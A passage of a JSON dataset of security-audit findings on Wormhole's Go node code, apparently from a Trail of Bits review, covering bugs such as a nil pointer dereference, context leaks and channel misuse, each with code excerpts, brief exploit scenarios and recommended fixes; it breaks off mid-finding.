        "body": "Publicly accessible functions within the governor and watcher code generally lack doc comments. Inadequately documented code can be misunderstood, which increases the likelihood of an improper bug x or a mis-implemented feature. There are ten publicly accessible functions within governor.go. However, only one such function has a comment preceding it (see gure 1.1). // Returns true if the message can be published, false if it has been added to the pending list. func (gov *ChainGovernor) ProcessMsg(msg *common.MessagePublication) bool { Figure 1.1: node/pkg/governor/governor.go#L281L282 Similarly, there are at least 28 publicly accessible functions among the non-evm watchers. However, only seven of them are preceded by doc comments, and only one of the seven is not in the Near watcher code (see gure 1.2). // GetLatestFinalizedBlockNumber() returns the latest published block. func (s *SolanaWatcher) GetLatestFinalizedBlockNumber() uint64 { Figure 1.2: node/pkg/watchers/solana/client.go#L846L847 Gos ocial documentation on doc comments states the following: A funcs doc comment should explain what the function returns or, for functions called for side eects, what it does. Exploit Scenario Alice, a Wormhole developer, implements a new node feature involving the governor. Alice misunderstands how the functions called by her new feature work. Alice introduces a vulnerability into the node as a result. Recommendations Short term, add doc comments to each function that are accessible from outside of the package in which the function is dened. This will facilitate code review and reduce the likelihood that a developer introduces a bug into the code because of a misunderstanding. Long term, regularly review code comments to ensure they are accurate. Documentation must be kept up to date to be benecial. References  Go Doc Comments",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Fields protected by mutex are not documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "The elds protected by the governors mutex are not documented. A developer adding functionality to the governor is unlikely to know whether the mutex must be locked for their application. The ChainGovernor struct appears in gure 2.1. The Wormhole Foundation communicated to us privately that the mutex protects the elds highlighted in yellow. Note that, because there are 13 elds in ChainGovernor (not counting the mutex itself), the likelihood of a developer guessing exactly the set of highlighted elds is small. type ChainGovernor struct { db logger mutex tokens tokensByCoinGeckoId chains msgsSeen db.GovernorDB *zap.Logger sync.Mutex map[tokenKey]*tokenEntry map[string][]*tokenEntry map[vaa.ChainID]*chainEntry map[string]bool // Key is hash, payload is consts transferComplete and transferEnqueued. []*common.MessagePublication int string int msgsToPublish dayLengthInMinutes coinGeckoQuery env nextStatusPublishTime time.Time nextConfigPublishTime time.Time statusPublishCounter int64 configPublishCounter int64 } Figure 2.1: node/pkg/governor/governor.go#L119L135 Exploit Scenario Alice, a Wormhole developer, adds a new function to the governor.  Case 1: Alice does not lock the mutex, believing that her function operates only on elds that are not protected by the mutex. However, by not locking the mutex, Alice introduces a race condition into the governor.  Case 2: Alice locks the mutex just to be safe. However, the elds on which Alices function operates are not protected by the mutex. Alice introduces a deadlock into the code as a result. Recommendations Short term, document the elds within ChainGovernor that are protected by the mutex. This will reduce the likelihood that a developer incorrectly locks, or does not lock, the mutex. Long term, regularly review code comments to ensure they are accurate. Documentation must be kept up to date to be benecial.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Potential nil pointer dereference in reloadPendingTransfer ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "A potential nil pointer dereference exists in reloadPendingTransfer. The bug could be triggered if invalid data were stored within a nodes database, and could make it impossible to restart the node. The relevant code appears in gures 3.1 and 3.2 When DecodeTransferPayloadHdr returns an error, the payload that is also returned is used to construct the error message (gure 3.1). However, as shown in gure 3.2, the returned payload can be nil. payload, err := vaa.DecodeTransferPayloadHdr(msg.Payload) if err != nil { gov.logger.Error(\"cgov: failed to parse payload for reloaded pending transfer, dropping it\", zap.String(\"MsgID\", msg.MessageIDString()), zap.Stringer(\"TxHash\", msg.TxHash), zap.Stringer(\"Timestamp\", msg.Timestamp), zap.Uint32(\"Nonce\", msg.Nonce), zap.Uint64(\"Sequence\", msg.Sequence), zap.Uint8(\"ConsistencyLevel\", msg.ConsistencyLevel), zap.Stringer(\"EmitterChain\", msg.EmitterChain), zap.Stringer(\"EmitterAddress\", msg.EmitterAddress), zap.Stringer(\"tokenChain\", payload.OriginChain), zap.Stringer(\"tokenAddress\", payload.OriginAddress), zap.Error(err), ) return } Figure 3.1: node/pkg/governor/governor_db.go#L90L106 func DecodeTransferPayloadHdr(payload []byte) (*TransferPayloadHdr, error) { if !IsTransfer(payload) { return nil, fmt.Errorf(\"unsupported payload type\") } Figure 3.2: sdk/vaa/structs.go#L962L965 Exploit Scenario Eve nds a code path that allows her to store erroneous payloads within the database of Alices node. Alice is unable to restart her node, as it tries to dereference a nil pointer on each attempt. Recommendations Short term, either eliminate the use of payload when constructing the error message, or verify that the payload is not nil before attempting to dereference it. This will eliminate a potential nil pointer dereference. Long term, add tests to exercise additional error paths within governor_db.go. This could help to expose bugs like this one.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Unchecked type assertion in queryCoinGecko ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "The code that processes CoinGecko responses contains an unchecked type assertion. The bug is triggered when CoinGecko returns invalid data, and could be exploited for denial of service (DoS). The relevant code appears in gure 4.1. The data object that is returned as part of CoinGeckos response to a query is cast to a map m of type map[string]interface{} (yellow). However, the casts success is not veried. As a result, a nil pointer dereference can occur when m is accessed (red). m := data.(map[string]interface{}) if len(m) != 0 { var ok bool price, ok = m[\"usd\"].(float64) if !ok { to configured price for this token\", zap.String(\"coinGeckoId\", coinGeckoId)) gov.logger.Error(\"cgov: failed to parse coin gecko response, reverting // By continuing, we leave this one in the local map so the price will get reverted below. continue } } Figure 4.1: node/pkg/governor/governor_prices.go#L144L153 Note that if the access to m is successful, the resulting value is cast to a float64. In this case, the casts success is veried. A similar check should be performed for the earlier cast. Exploit Scenario Eve, a malicious insider at CoinGecko, sends invalid data to Wormhole nodes, causing them to crash. Recommendations Short term, in the code in gure 4.1, verify that the cast in yellow is successful by adding a check similar to the one highlighted in green. This will eliminate the possibility of a node crashing because CoinGecko returns invalid data. Long term, consider enabling the forcetypeassert lint in CI. This bug was initially agged by that lint, and then conrmed by our queryCoinGecko response fuzzer. Enabling the lint could help to expose additional bugs like this one.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Governor relies on a single external source of truth for asset prices ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "The governor relies on a single external source (CoinGecko) for asset prices, which could enable an attacker to transfer more than they would otherwise be allowed. The governor fetches an assets price from CoinGecko, compares the price to a hard-coded default, and uses whichever is larger (gure 5.1). However, if an assets price were to grow much larger than the hard-coded default, the hard-coded default would essentially be meaningless, and CoinGecko would become the sole source of truth for the price of that asset. Such a situation could be problematic, for example, if the assets price were volatile and CoinGecko had trouble keeping up with the price changes. // We should use the max(coinGeckoPrice, configuredPrice) as our price for computing notional value. func (te tokenEntry) updatePrice() { if (te.coinGeckoPrice == nil) || (te.coinGeckoPrice.Cmp(te.cfgPrice) < 0) { te.price.Set(te.cfgPrice) } else { te.price.Set(te.coinGeckoPrice) } } Figure 5.1: node/pkg/governor/governor_prices.go#L205L212 Exploit Scenario Eve obtains a large quantity of AliceCoin from a hack. AliceCoins price is both highly volatile and much larger than what was hard-coded in the last Wormhole release. CoinGecko has trouble keeping up with the current price of AliceCoin. Eve identies a point in time when the price that CoinGecko reports is low (but still higher than the hard-coded default). Eve uses the opportunity to move more of her maliciously obtained AliceCoin than Wormhole would allow if CoinGecko had reported the correct price. Recommendations Short term, monitor the price of assets supported by Wormhole. If the price of an asset increases substantially, consider issuing a release that takes into account the new price. This will help to avoid situations where CoinGecko becomes the sole source of truth of the price of an asset. Long term, incorporate additional price oracles besides CoinGecko. This will provide more robust protection than requiring a human to monitor prices and issue point releases.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Potential resource leak ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "Calls to some Contexts cancel functions are missing along certain code paths involving panics. If an attacker were able to exercise these code paths in rapid succession, they could exhaust system resources and cause a DoS. Within watcher.go, WithTimeout is essentially used in one of two ways, using the pattern shown in either gure 6.1 or 6.2. The pattern of gure 6.1 is problematic because cancel will not be called if a panic occurs in MessageEventsForTransaction. By comparison, cancel will be called if a panic occurs after the defer statement in gure 6.2. Note that if a panic occurred in either gure 6.1 or 6.2, RunWithScissors (gure 6.3) would prevent the program from terminating. timeout, cancel := context.WithTimeout(ctx, 5*time.Second) blockNumber, msgs, err := MessageEventsForTransaction(timeout, w.ethConn, w.contract, w.chainID, tx) cancel() Figure 6.1: node/pkg/watchers/evm/watcher.go#L395L397 timeout, cancel := context.WithTimeout(ctx, 15*time.Second) defer cancel() Figure 6.2: node/pkg/watchers/evm/watcher.go#L186L187 // Start a go routine with recovering from any panic by sending an error to a error channel func RunWithScissors(ctx context.Context, errC chan error, name string, runnable supervisor.Runnable) { ScissorsErrors.WithLabelValues(\"scissors\", name).Add(0) go func() { defer func() { if r := recover(); r != nil { switch x := r.(type) { case error: errC <- fmt.Errorf(\"%s: %w\", name, x) default: errC <- fmt.Errorf(\"%s: %v\", name, x) } ScissorsErrors.WithLabelValues(\"scissors\", name).Inc() } }() err := runnable(ctx) if err != nil { errC <- err } }() } Figure 6.3: node/pkg/common/scissors.go#L20L41 Golangs ocial Context documentation states: The WithCancel, WithDeadline, and WithTimeout functions take a Context (the parent) and return a derived Context (the child) and a CancelFunc.  Failing to call the CancelFunc leaks the child and its children until the parent is canceled or the timer res.  In light of the above guidance, it seems prudent to call the cancel function, even along panicking paths. Note that the problem described applies to three locations in watch.go: one involving a call to MessageEventsForTransaction (gure 6.1), one involving a call to TimeOfBlockByHash, and one involving a call to TransactionReceipt. Exploit Scenario Eve discovers a code path she can call in rapid succession, which induces a panic in the call to MessageEventsForTransaction (gure 6.1). Eve exploits this code path to crash Wormhole nodes. Recommendations Short term, use the defer cancel() pattern (gure 6.2) wherever WithTimeout is used. This will help to prevent DoS conditions. Long term, regard all code involving Contexts with heightened scrutiny. Contexts are frequently a source of resource leaks in Go programs, and deserve elevated attention. References  Golang Context WithTimeout Example",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. PolygonConnector does not properly use channels ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "The Polygon connector does not read from the PollSubscription.quit channel, nor does it write to the PollSubscription.unsubDone channel. A caller who calls Unsubscribe on the PollSubscription could hang. A PollSubscription struct contains three channels: err, quit, and unsubDone (gure 7.1). Based on our understanding of the code, the entity that fullls the subscription writes to the err and unsubDone channels, and reads from the quit channel. Conversely, the entity that consumes the subscription reads from the err and unsubDone channels, and writes to the quit channel.1 type PollSubscription struct { errOnce err quit unsubDone chan struct{} sync.Once chan error chan error } Figure 7.1: node/pkg/watchers/evm/connectors/common.go#L38L43 More specically, the consumer can call PollSubscription.Unsubscribe, which writes ErrUnsubscribed to the quit channel and waits for a message on the unsubDone channel (gure 7.2). func (sub *PollSubscription) Unsubscribe() { sub.errOnce.Do(func() { select { case sub.quit <- ErrUnsubscribed: <-sub.unsubDone case <-sub.unsubDone: } close(sub.err) }) } Figure 7.2: node/pkg/watchers/evm/connectors/common.go#L59L68 1 If our understanding is correct, we recommend documenting these facts. However, the Polygon connector does not read from the quit channel, nor does it write to the unsubDone channel (gure 7.3). This is unlike BlockPollConnector (gure 7.4), for example. Thus, if a caller tries to call Unsubscribe on the Polygon connector PollSubscription, the caller may hang. select { case <-ctx.Done(): return nil case err := <-messageSub.Err(): sub.err <- err case checkpoint := <-messageC: if err := c.processCheckpoint(ctx, sink, checkpoint); err != nil { sub.err <- fmt.Errorf(\"failed to process checkpoint: %w\", err) } } Figure 7.3: node/pkg/watchers/evm/connectors/polygon.go#L120L129 select { case <-ctx.Done(): blockSub.Unsubscribe() innerErrSub.Unsubscribe() return nil case <-sub.quit: blockSub.Unsubscribe() innerErrSub.Unsubscribe() sub.unsubDone <- struct{}{} return nil case v := <-innerErrSink: sub.err <- fmt.Errorf(v) } Figure 7.4: node/pkg/watchers/evm/connectors/poller.go#L180L192 Exploit Scenario Alice, a Wormhole developer, adds a code path that involves calling Unsubscribe on a Polygon connectors PollSubscription. By doing so, Alice introduces a deadlock into the code. Recommendations Short term, adjust the code in gure 7.3 so that it reads from the quit channel and writes to the unsubDone channel, similar to how the code in gure 7.4 does. This will eliminate a class of code paths along which hangs or deadlocks could occur. Long term, consider refactoring the code so that the select statements in gures 7.3 and 7.4, as well as a similar statement in LogPollConnector, are consolidated under a single function. The three statements appear similar in their behavior; combining them would make the code more robust against future changes and could help to prevent bugs like this one.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Receiver closes channel, contradicting Golang guidance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "According to Golangs ocial guidance, Only the sender should close a channel, never the receiver. Sending on a closed channel will cause a panic. However, along some code paths within the watcher code, the receiver of a channel closes the channel. When PollSubscription.Unscbscribe is called, it closes the err channel (gure 8.1). However, in logpoller.go (gure 8.2), the caller of Unsubscribe (red) is clearly an err channel receiver (green). func (sub *PollSubscription) Err() <-chan error { return sub.err } func (sub *PollSubscription) Unsubscribe() { sub.errOnce.Do(func() { select { case sub.quit <- ErrUnsubscribed: <-sub.unsubDone case <-sub.unsubDone: } close(sub.err) }) } Figure 8.1: node/pkg/watchers/evm/connectors/common.go#L55L68 sub, err := l.SubscribeForBlocks(ctx, errC, blockChan) if err != nil { return err } defer sub.Unsubscribe() supervisor.Signal(ctx, supervisor.SignalHealthy) for { select { case <-ctx.Done(): return ctx.Err() case err := <-sub.Err(): return err case err := <-errC: return err case block := <-blockChan: if err := l.processBlock(ctx, logger, block); err != nil { l.errFeed.Send(err.Error()) } } } Figure 8.2: node/pkg/watchers/evm/connectors/logpoller.go#L49L69 Exploit Scenario Eve discovers a code path along which a sender tries to send to an already closed err channel and panics. RunWithScissors (see TOB-WORMGUWA-6) prevents the node from terminating, but the node is left in an undetermined state. Recommendations Short term, eliminate the call to close in gure 8.1. This will eliminate a class of code paths along which the err channels sender(s) could panic. Long term, for each channel, document who the expected senders and receivers are. This will help catch bugs like this one. References  A Tour of Go: Range and Close",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "9. Watcher conguration is overly complex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "The Run function of the Watcher congures each chains connection based on its elds, unsafeDevMode and chainID. This is done in a series of nested if-statements that span over 100 lines, amounting to a cyclomatic complexity over 90 which far exceeds what is considered complex. In order to make the code easier to understand, test, and maintain, it should be refactored. Rather than handling all of the business logic in a monolithic function, the logic for each chain should be isolated within a dedicated helper function. This would make the code easier to follow and reduce the likelihood that an update to one chains conguration inadvertently introduces a bug for other chains. if w.chainID == vaa.ChainIDCelo && !w.unsafeDevMode { // When we are running in mainnet or testnet, we need to use the Celo ethereum library rather than go-ethereum. // However, in devnet, we currently run the standard ETH node for Celo, so we need to use the standard go-ethereum. w.ethConn, err = connectors.NewCeloConnector(timeout, w.networkName, w.url, w.contract, logger) if err != nil { ethConnectionErrors.WithLabelValues(w.networkName, \"dial_error\").Inc() p2p.DefaultRegistry.AddErrorCount(w.chainID, 1) return fmt.Errorf(\"dialing eth client failed: %w\", err) } } else if useFinalizedBlocks { if w.chainID == vaa.ChainIDEthereum && !w.unsafeDevMode { safeBlocksSupported = true logger.Info(\"using finalized blocks, will publish safe blocks\") } else { logger.Info(\"using finalized blocks\") } [...] /* many more nested branches */ Figure 9.1: node/pkg/watchers/evm/watcher.go#L192L326 Exploit Scenario Alice, a wormhole developer, introduces a bug that causes guardians to run in unsafe mode in production while adding support for a new evm chain due to the diculty of modifying and testing the nested code. Recommendations Short term, isolate each chains conguration into a helper function and document how the congurations were determined. Long term, run linters in CI to identify code with high cyclomatic complexity and consider whether complex code can be simplied during code reviews.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "10. evm.Watcher.Runs default behavior could hide bugs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "evm.Watcher.Run tries to create an evm watcher, even if called with a ChainID that does not correspond to an evm chain. Additional checks should be added to evm.Watcher.Run to reject such ChainIDs. Approximately 60 watchers are started in node/cmd/guardiand/node.go (gure 10.1). Fifteen of those starts result in calls to evm.Watcher.Run. Given the substantial number of ChainIDs, one can imagine a bug where a developer tries to create an evm watcher with a ChainID that is not for an evm chain. Such a ChainID would be handled by the blanket else in gure 10.2, which tries to create an evm watcher. Such behavior could allow the bug to go unnoticed. To avoid this possibility, evm.Watcher.Runs default behavior should be to fail rather than to create a watcher. if shouldStart(ethRPC) { ... ethWatcher = evm.NewEthWatcher(*ethRPC, ethContractAddr, \"eth\", common.ReadinessEthSyncing, vaa.ChainIDEthereum, chainMsgC[vaa.ChainIDEthereum], setWriteC, chainObsvReqC[vaa.ChainIDEthereum], *unsafeDevMode) ... } if shouldStart(bscRPC) { ... bscWatcher := evm.NewEthWatcher(*bscRPC, bscContractAddr, \"bsc\", common.ReadinessBSCSyncing, vaa.ChainIDBSC, chainMsgC[vaa.ChainIDBSC], nil, chainObsvReqC[vaa.ChainIDBSC], *unsafeDevMode) ... } if shouldStart(polygonRPC) { ... polygonWatcher := evm.NewEthWatcher(*polygonRPC, polygonContractAddr, \"polygon\", common.ReadinessPolygonSyncing, vaa.ChainIDPolygon, chainMsgC[vaa.ChainIDPolygon], nil, chainObsvReqC[vaa.ChainIDPolygon], *unsafeDevMode) } ... Figure 10.1: node/cmd/guardiand/node.go#L1065L1104 ... } else if w.chainID == vaa.ChainIDOptimism && !w.unsafeDevMode { ... } else if w.chainID == vaa.ChainIDPolygon && w.usePolygonCheckpointing() { ... } else { w.ethConn, err = connectors.NewEthereumConnector(timeout, w.networkName, w.url, w.contract, logger) if err != nil { ethConnectionErrors.WithLabelValues(w.networkName, \"dial_error\").Inc() p2p.DefaultRegistry.AddErrorCount(w.chainID, 1) return fmt.Errorf(\"dialing eth client failed: %w\", err) } } Figure 10.2: node/pkg/watchers/evm/watcher.go#L192L326 Exploit Scenario Alice, a Wormhole developer, introduces a call to NewEvmWatcher with a ChainID that is not for an evm chain. evm.Watcher.Run accepts the invalid ChainID, and the error goes unnoticed. Recommendations Short term, rewrite evm.Watcher.Run so that a new watcher is created only when a ChainID for an evm chain is passed. When a ChainID for some other chain is passed, evm.Watcher.Run should return an error. Adopting such a strategy will help protect against bugs in node/cmd/guardiand/node.go. Long term:  Add tests to the guardiand package to verify that the right watcher is created for each ChainID. This will help ensure the packages correctness.  Consider whether TOB-WORMGUWA-9s recommendations should also apply to node/cmd/guardiand/node.go. That is, consider whether the watcher conguration should be handled in node/cmd/guardiand/node.go, as opposed to evm.Watcher.Run. The le node/cmd/guardiand/node.go appears to suer from similar complexity issues. It is possible that a single strategy could address the shortcomings of both pieces of code.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Race condition in TestBlockPoller ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "A race condition causes TestBlockPoller to fail sporadically with the error message in gure 11.1. For a test to be of value, it must be reliable. poller_test.go:300: Error Trace: Error: .../node/pkg/watchers/evm/connectors/poller_test.go:300 Received unexpected error: polling encountered an error: failed to look up latest block: RPC failed Test: TestBlockPoller Figure 11.1: Error produced when TestBlockPoller fails A potential code interleaving causing the above error appears in gure 11.2. The interleaving can be explained as follows:  The main thread sets the baseConnectors error and yields (left column).  The go routine declared at poller_test.go:189 retrieves the error, sets the err variable, loops, retrieves the error a second time, and yields (right column).  The main thread locks the mutex, veries that err is set, clears err, and unlocks the mutex (left).  The go routine sets the err variable a second time (right).  The main thread locks the mutex and panics because err is set (left). baseConnector.setError(fmt.Errorf(\"RPC failed\")) case thisErr := <-headerSubscription.Err(): mutex.Lock() err = thisErr mutex.Unlock() ... case thisErr := <-headerSubscription.Err(): time.Sleep(10 * time.Millisecond) mutex.Lock() require.Equal(t, 1, pollerStatus) assert.Error(t, err) assert.Nil(t, block) baseConnector.setError(nil) err = nil mutex.Unlock() // Post the next block and verify we get it (so we survived the RPC error). baseConnector.setBlockNumber(0x309a10) time.Sleep(10 * time.Millisecond) mutex.Lock() require.Equal(t, 1, pollerStatus) require.NoError(t, err) mutex.Lock() err = thisErr mutex.Unlock() Figure 11.2: Interleaving of node/pkg/watchers/evm/connectors/poller_test.go#L283L300 (left) and node/pkg/watchers/evm/connectors/poller_test.go#L198L201 (right) that causes an error Exploit Scenario Alice, a Wormhole developer, ignores TestBlockPoller failures because she believes the test to be aky. In reality, the test is agging a bug in Alices code, which she commits to the Wormhole repository. Recommendations Short term:  Use dierent synchronization mechanisms in order to eliminate the race condition described above. This will increase TestBlockPollers reliability.  Have the main thread sleep for random rather than xed intervals. This will help to expose bugs like this one. Long term, investigate automated tools for nding concurrency bugs in Go programs. This bug is not agged by Gos race detector. As a result, dierent analyses are needed.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Unconventional test structure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "Tilt is the primary means of testing Wormhole watchers. Relying on such a coarse testing mechanism makes it dicult to know that all necessary conditions and edge cases are tested. The following are some conditions that should be checked by native Go unit tests:  The right watcher is created for each ChainID (TOB-WORMGUWA-10).  The evm watchers connectors behave correctly (similar to how the evm nalizers correct behavior is now tested).2  The evm watchers logpoller behaves correctly (similar to how the pollers correct behavior is now tested by poller_test.go).  There are no o-by-one errors in any inequality involving a block or round number. Examples of such inequalities include the following:  node/pkg/watchers/algorand/watcher.go#L225  node/pkg/watchers/algorand/watcher.go#L243  node/pkg/watchers/solana/client.go#L363  node/pkg/watchers/solana/client.go#L841 To be clear, we are not suggesting that the Tilt tests be discarded. However, the Tilt tests should not be the sole means of testing the watchers for any given chain. Exploit Scenario Alice, a Wormhole developer, introduces a bug into the codebase. The bug is not exposed by the Tilt tests. Recommendations Short term, develop unit tests for the watcher code. Get as close to 100% code coverage as possible. Develop specic unit tests for conditions that seem especially problematic. These steps will help ensure the correctness of the watcher code. 2 Note that the evm watchers nalizers have nearly 100% code coverage by unit tests. Long term, regularly review test coverage to help identify gaps in the tests as the code evolves.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Vulnerable Go packages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "govulncheck reports that the packages used by Wormhole in table 13.1 have known vulnerabilities, which are described in the following table. Package Vulnerability",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "14. Wormhole node does not build with latest Go version ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "Attempting to build a Wormhole node with the latest Go version (1.20.1) produces the error in gure 14.1. Gos release policy states, Each major Go release is supported until there are two newer major releases. By not building with the latest Go version, Wormholes ability to receive updates will expire. cannot use \"The version of quic-go you're using can't be built on Go 1.20 yet. For more details, please see https://github.com/lucas-clemente/quic-go/wiki/quic-go-and-Go-versions.\" (untyped string constant \"The version of quic-go you're using can't be built on Go 1.20 yet. F...) as int value in variable declaration Figure 14.1: Error produced when one tries to build the Wormhole with the latest Go version (1.20) It is unclear when Go 1.21 will be released. Go 1.20 was released on February 1, 2023 (a few days prior to the start of the audit), and new versions appear to be released about every six months. We found a thread discussing Go 1.21, but it does not mention dates. Exploit Scenario Alice attempts to build a Wormhole node with Go version 1.20. When her attempt fails, Alice switches to Go version 1.19. Go 1.21 is released, and Go 1.19 ceases to receive updates. A vulnerability is found in a Go 1.19 package, and Alice is left vulnerable. Recommendations Short term, adapt the code so that it builds with Go version 1.20. This will allow Wormhole to receive updates for a greater period of time than if it builds only with Go version 1.19. Long term, test with the latest Go version in CI. This will help identify incompatibilities like this one sooner. References  Go Release History (see Release Policy)  Planning Go 1.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Missing or wrong context ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "In several places where a Context is required, the Wormhole node creates a new background Context rather than using the passed-in Context. If the passed-in Context is canceled or times out, a go routine using the background Context will not detect this, and resources will be leaked. The aforementioned problem is agged by the contextcheck lint. For each of the locations named in gure 15.1, a Context is passed in to the enclosing function, but the passed-in Context is not used. Rather, a new background Context is created. algorand/watcher.go:172:51: Non-inherited new context, use function like `context.WithXXX` instead (contextcheck) status, err := algodClient.StatusAfterBlock(0).Do(context.Background()) ^ algorand/watcher.go:196:139: Non-inherited new context, use function like `context.WithXXX` instead (contextcheck) result, err := indexerClient.SearchForTransactions().TXID(base32.StdEncoding.WithPadding(base32.NoP adding).EncodeToString(r.TxHash)).Do(context.Background()) ^ algorand/watcher.go:205:42: Non-inherited new context, use function like `context.WithXXX` instead (contextcheck) block, err := algodClient.Block(r).Do(context.Background()) ^ Figure 15.1: Warnings produced by contextcheck A closely related problem is agged by the noctx lint. In each of the locations named in gure 15.2, http.Get or http.Post is used. These functions do not take a Context argument. As such, if the Context passed in to the enclosing function is canceled, the Get or Post will not similarly be canceled. cosmwasm/watcher.go:198:28: (*net/http.Client).Get must not be called (noctx) resp, err := client.Get(fmt.Sprintf(\"%s/%s\", e.urlLCD, e.latestBlockURL)) ^ cosmwasm/watcher.go:246:28: (*net/http.Client).Get must not be called (noctx) resp, err := client.Get(fmt.Sprintf(\"%s/cosmos/tx/v1beta1/txs/%s\", e.urlLCD, tx)) ^ sui/watcher.go:315:26: net/http.Post must not be called (noctx) resp, err := http.Post(e.suiRPC, \"application/json\", strings.NewReader(buf)) ^ sui/watcher.go:378:26: net/http.Post must not be called (noctx) strings.NewReader(`{\"jsonrpc\":\"2.0\", \"id\": 1, \"method\": \"sui_getCommitteeInfo\", \"params\": []}`)) resp, err := http.Post(e.suiRPC, \"application/json\", ^ wormchain/watcher.go:136:27: (*net/http.Client).Get must not be called (noctx) resp, err := client.Get(fmt.Sprintf(\"%s/blocks/latest\", e.urlLCD)) Figure 15.2: Warnings produced by noctx ^ Exploit Scenario A bug causes Alices Algorand, Cosmwasm, Sui, or Wormchain node to hang. The bug triggers repeatedly. The connections from Alices Wormhole node to the respective blockchain nodes hang, causing unnecessary resource consumption. Recommendations Short term, take the following steps:  For each location named in gure 15.1, use the passed-in Context rather than creating a new background Context.  For each location named in gure 15.2, rewrite the code to use http.Client.Do. Taking these steps will help to prevent unnecessary resource consumption and potential denial of service. Long term, enable the contextcheck and notctx lints in CI. The problems highlighted in this nding were uncovered by those lints. Running them regularly could help to identify similar problems. References  checkcontext  noctx",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Use of defer in a loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "The Solana watcher uses defer within an innite loop (gure 16.1). Deferred calls are executed when their enclosing function returns. Since the enclosing loop is not exited under normal circumstances, the deferred calls are never executed and constitute a waste of resources. for { select { case <-ctx.Done(): return nil default: rCtx, cancel := context.WithTimeout(ctx, time.Second*300) // 5 minute defer cancel() ... } } Figure 16.1: node/pkg/watchers/solana/client.go#L244L271 Sample code demonstrating the problem appears in appendix E. Exploit Scenario Alice runs her Wormhole node in an environment with constrained resources. Alice nds that her node is not able to achieve the same uptime as other Wormhole nodes. The underlying cause is resource exhaustion caused by the Solana watcher. Recommendations Short term, rewrite the code in gure 16.1 to eliminate the use of defer in the for loop. The easiest and most straightforward way would likely be to move the code in the default case into its own named function. Eliminating this use of defer in a loop will eliminate a potential source of resource exhaustion. Long term, regularly review uses of defer to ensure they do not appear in a loop. To the best of our knowledge, there are not publicly available detectors for problems like this. However, regular manual review should be sucient to spot them.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Finalizer is allowed to be nil ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf",
        "body": "The conguration of a chains watcher can allow a nalizer to be nil, which may allow newly introduced bugs to go unnoticed. Whenever a chains RPC does not have a notion of safe or nalized blocks, the watcher polls the chain for the latest block using BlockPollConnector. After fetching a block, the watcher checks whether it is nal in accordance with the respective chains PollFinalizer implementation. // BlockPollConnector polls for new blocks instead of subscribing when using SubscribeForBlocks. It allows to specify a // finalizer which will be used to only return finalized blocks on subscriptions. type BlockPollConnector struct { Connector time.Duration Delay useFinalized bool publishSafeBlocks bool finalizer blockFeed errFeed PollFinalizer ethEvent.Feed ethEvent.Feed } Figure 17.1: node/pkg/watchers/evm/connectors/poller.go#L24L34 However, the method pollBlocks allows BlockPollConnector to have a nil PollFinalizer (see gure 17.2). This is unnecessary and may permit edge cases that could otherwise be avoided by requiring all BlockPollConnectors to use the DefaultFinalizer explicitly if a nalizer is not required (the default nalizer accepts all blocks as nal). This will ensure that the watcher does not incidentally process a block received from blockFeed that is not in the canonical chain . if 